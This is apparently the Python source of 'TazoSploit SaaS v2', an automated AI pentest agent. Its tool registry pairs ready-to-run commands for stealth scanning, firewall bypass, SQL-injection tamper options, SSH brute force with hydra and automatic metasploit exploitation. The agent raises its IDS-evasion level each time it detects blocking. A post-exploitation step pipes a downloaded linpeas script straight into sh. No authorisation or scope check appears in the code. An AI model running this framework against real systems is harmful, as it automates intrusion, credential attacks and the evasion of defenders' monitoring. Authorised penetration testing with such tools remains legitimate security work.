"""
TazoSploit SaaS v2 - Advanced AI Agent
Intelligent tool selection, evasion techniques, and iterative approach

Features:
- Select best tool for each task
- Retry with alternative tools if blocked
- Advanced evasion techniques for firewalls/IDS
- Full I/O capture for debugging
"""

import os
import json
import time
import logging
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, asdict, field
from enum import Enum

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger("tazosploit.agent")


class ToolCategory(Enum):
    RECON = "recon"
    VULN_SCAN = "vuln_scan"
    EXPLOIT = "exploit"
    POST_EXPLOIT = "post_exploit"
    CRED_ATTACK = "cred_attack"


@dataclass
class ToolConfig:
    """Configuration for a pentest tool"""
    name: str
    command: str
    category: ToolCategory
    evasion_level: int  # 0=basic, 1=moderate, 2=advanced
    alternatives: List[str] = field(default_factory=list)
    timeout: int = 300


@dataclass 
class IOCapture:
    """Captures all input/output for debugging"""
    timestamp: str
    tool: str
    command: str
    stdin: str
    stdout: str
    stderr: str
    exit_code: int
    duration_ms: int
    success: bool
    notes: str = ""


class ToolRegistry:
    """Registry of available tools with alternatives and evasion levels"""
    
    TOOLS = {
        # === RECONNAISSANCE ===
        "nmap_basic": ToolConfig(
            name="nmap",
            command="nmap -sV -sC {target}",
            category=ToolCategory.RECON,
            evasion_level=0,
            alternatives=["nmap_stealth", "masscan", "zmap"]
        ),
        "nmap_stealth": ToolConfig(
            name="nmap_stealth",
            command="nmap -sS -T2 -f --data-length 24 -D RND:5 {target}",
            category=ToolCategory.RECON,
            evasion_level=2,
            alternatives=["masscan", "unicornscan"]
        ),
        "nmap_firewall_bypass": ToolConfig(
            name="nmap_fw_bypass",
            command="nmap -sA -Pn --source-port 53 -f -T2 {target}",
            category=ToolCategory.RECON,
            evasion_level=2,
            alternatives=["hping3", "nping"]
        ),
        "masscan": ToolConfig(
            name="masscan",
            command="masscan -p1-65535 --rate=1000 {target}",
            category=ToolCategory.RECON,
            evasion_level=1,
            alternatives=["nmap_stealth", "zmap"]
        ),
        
        # === VULNERABILITY SCANNING ===
        "nikto_basic": ToolConfig(
            name="nikto",
            command="nikto -h {target}",
            category=ToolCategory.VULN_SCAN,
            evasion_level=0,
            alternatives=["nikto_evasion", "nuclei"]
        ),
        "nikto_evasion": ToolConfig(
            name="nikto_evasion",
            command="nikto -h {target} -evasion 1,2,3,4,5,6,7,8 -Tuning x",
            category=ToolCategory.VULN_SCAN,
            evasion_level=2,
            alternatives=["nuclei", "whatweb"]
        ),
        "nuclei": ToolConfig(
            name="nuclei",
            command="nuclei -u {target} -severity critical,high -rate-limit 10",
            category=ToolCategory.VULN_SCAN,
            evasion_level=1,
            alternatives=["nikto_evasion", "wpscan"]
        ),
        "sqlmap_basic": ToolConfig(
            name="sqlmap",
            command="sqlmap -u {target} --batch --level=1 --risk=1",
            category=ToolCategory.VULN_SCAN,
            evasion_level=0,
            alternatives=["sqlmap_evasion", "commix"]
        ),
        "sqlmap_evasion": ToolConfig(
            name="sqlmap_evasion",
            command="sqlmap -u {target} --batch --tamper=space2comment,between --random-agent --delay=2",
            category=ToolCategory.VULN_SCAN,
            evasion_level=2,
            alternatives=["commix", "nosqlmap"]
        ),
        
        # === EXPLOITATION ===
        "hydra_basic": ToolConfig(
            name="hydra",
            command="hydra -L users.txt -P pass.txt {target} ssh",
            category=ToolCategory.EXPLOIT,
            evasion_level=0,
            alternatives=["hydra_slow", "medusa", "ncrack"]
        ),
        "hydra_slow": ToolConfig(
            name="hydra_slow",
            command="hydra -L users.txt -P pass.txt -t 1 -W 3 {target} ssh",
            category=ToolCategory.EXPLOIT,
            evasion_level=1,
            alternatives=["medusa", "patator"]
        ),
        "metasploit": ToolConfig(
            name="msfconsole",
            command="msfconsole -q -x 'search {exploit}; use 0; set RHOSTS {target}; run'",
            category=ToolCategory.EXPLOIT,
            evasion_level=1,
            alternatives=["manual_exploit"]
        ),
        
        # === POST EXPLOITATION ===
        "linpeas": ToolConfig(
            name="linpeas",
            command="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            category=ToolCategory.POST_EXPLOIT,
            evasion_level=0,
            alternatives=["linux_exploit_suggester", "manual_enum"]
        ),
        "crackmapexec": ToolConfig(
            name="crackmapexec",
            command="crackmapexec smb {target} -u {user} -p {pass} --shares",
            category=ToolCategory.POST_EXPLOIT,
            evasion_level=1,
            alternatives=["smbclient", "rpcclient"]
        ),
    }
    
    @classmethod
    def get_tool(cls, name: str) -> Optional[ToolConfig]:
        return cls.TOOLS.get(name)
    
    @classmethod
    def get_alternatives(cls, name: str) -> List[str]:
        tool = cls.get_tool(name)
        return tool.alternatives if tool else []
    
    @classmethod
    def get_by_category(cls, category: ToolCategory) -> List[ToolConfig]:
        return [t for t in cls.TOOLS.values() if t.category == category]


class AdvancedAgent:
    """
    Advanced AI Agent with:
    - Intelligent tool selection
    - Automatic retry with alternatives
    - Evasion techniques
    - Full I/O capture
    """
    
    def __init__(self, log_dir: str = "/pentest/logs"):
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        self.io_captures: List[IOCapture] = []
        self.failed_tools: List[str] = []
        self.current_evasion_level = 0
        
    def select_best_tool(self, category: ToolCategory, 
                        failed_tools: List[str] = None) -> Optional[ToolConfig]:
        """Select the best tool for a task, avoiding failed ones"""
        failed = failed_tools or self.failed_tools
        
        tools = ToolRegistry.get_by_category(category)
        
        # Sort by evasion level (prefer current level, then higher)
        tools.sort(key=lambda t: (
            abs(t.evasion_level - self.current_evasion_level),
            t.evasion_level
        ))
        
        for tool in tools:
            if tool.name not in failed:
                return tool
        
        return None
    
    def escalate_evasion(self):
        """Escalate to more stealthy techniques"""
        if self.current_evasion_level < 2:
            self.current_evasion_level += 1
            logger.info(f"Escalating evasion level to {self.current_evasion_level}")
    
    def execute_with_capture(self, tool: ToolConfig, target: str,
                            extra_params: Dict = None) -> IOCapture:
        """Execute tool and capture all I/O"""
        import subprocess
        
        # Build command
        command = tool.command.format(target=target, **(extra_params or {}))
        
        logger.info(f"Executing: {command}")
        start_time = time.time()
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=tool.timeout,
                cwd="/pentest"
            )
            
            duration_ms = int((time.time() - start_time) * 1000)
            success = result.returncode == 0
            
            capture = IOCapture(
                timestamp=datetime.utcnow().isoformat(),
                tool=tool.name,
                command=command,
                stdin="",
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
                duration_ms=duration_ms,
                success=success
            )
            
        except subprocess.TimeoutExpired:
            capture = IOCapture(
                timestamp=datetime.utcnow().isoformat(),
                tool=tool.name,
                command=command,
                stdin="",
                stdout="",
                stderr="TIMEOUT: Command exceeded timeout",
                exit_code=-1,
                duration_ms=tool.timeout * 1000,
                success=False,
                notes="Timeout - may indicate IDS blocking"
            )
            
        except Exception as e:
            capture = IOCapture(
                timestamp=datetime.utcnow().isoformat(),
                tool=tool.name,
                command=command,
                stdin="",
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration_ms=0,
                success=False,
                notes=f"Exception: {type(e).__name__}"
            )
        
        # Save capture
        self.io_captures.append(capture)
        self._save_capture(capture)
        
        return capture
    
    def execute_with_retry(self, category: ToolCategory, target: str,
                          max_retries: int = 3) -> Tuple[bool, List[IOCapture]]:
        """Execute with automatic retry using alternative tools"""
        captures = []
        failed_tools = []
        
        for attempt in range(max_retries):
            tool = self.select_best_tool(category, failed_tools)
            
            if not tool:
                logger.warning(f"No more tools available for {category.value}")
                break
            
            logger.info(f"Attempt {attempt + 1}: Using {tool.name}")
            
            capture = self.execute_with_capture(tool, target)
            captures.append(capture)
            
            if capture.success:
                return True, captures
            
            # Check for IDS/firewall indicators
            if self._detect_blocking(capture):
                logger.warning("Detected blocking - escalating evasion")
                self.escalate_evasion()
            
            failed_tools.append(tool.name)
            self.failed_tools.append(tool.name)
        
        return False, captures
    
    def _detect_blocking(self, capture: IOCapture) -> bool:
        """Detect if we're being blocked by IDS/firewall"""
        blocking_indicators = [
            "filtered",
            "connection refused",
            "connection reset",
            "timeout",
            "no route to host",
            "blocked",
            "denied"
        ]
        
        output = (capture.stdout + capture.stderr).lower()
        return any(ind in output for ind in blocking_indicators)
    
    def _save_capture(self, capture: IOCapture):
        """Save capture to log file"""
        log_file = os.path.join(self.log_dir, "io_captures.jsonl")
        with open(log_file, 'a') as f:
            f.write(json.dumps(asdict(capture)) + '\n')
    
    def get_all_captures(self) -> List[Dict]:
        """Get all I/O captures for debugging"""
        return [asdict(c) for c in self.io_captures]
    
    def generate_report(self) -> Dict:
        """Generate summary report of agent activity"""
        return {
            "total_commands": len(self.io_captures),
            "successful_commands": sum(1 for c in self.io_captures if c.success),
            "failed_commands": sum(1 for c in self.io_captures if not c.success),
            "failed_tools": list(set(self.failed_tools)),
            "final_evasion_level": self.current_evasion_level,
            "captures": self.get_all_captures()
        }


# Example usage
if __name__ == "__main__":
    agent = AdvancedAgent()
    
    # Test reconnaissance with retry
    success, captures = agent.execute_with_retry(
        ToolCategory.RECON, 
        "scanme.nmap.org"
    )
    
    print(f"Success: {success}")
    print(f"Attempts: {len(captures)}")
    print(json.dumps(agent.generate_report(), indent=2))
